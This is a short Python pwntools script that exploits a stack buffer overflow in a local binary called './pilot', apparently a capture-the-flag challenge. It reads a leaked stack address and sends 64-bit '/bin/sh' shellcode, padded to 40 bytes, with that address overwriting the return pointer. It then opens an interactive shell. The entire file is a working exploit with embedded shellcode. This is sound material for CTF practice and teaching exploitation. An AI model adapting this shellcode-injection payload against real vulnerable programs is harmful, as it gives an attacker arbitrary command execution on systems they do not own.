from pwn import *

r = process('./pilot')

# read response until "Location:" string is found
r.recvuntil(b'Location:')
# store "Location" address in variable
address = r.recvuntil(b'\n')[:-1]
# 64-bit Linux '/bin/sh' shellcode
shell_please = b"\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
# prepend shellcode, pad with "A"s and append "Location" address as little-endian, 64-bit address
payload = shell_please + b'A' * (40-len(shell_please)) + p64(int(address, 16))

r.send(payload)
# interact with shell
r.interactive()
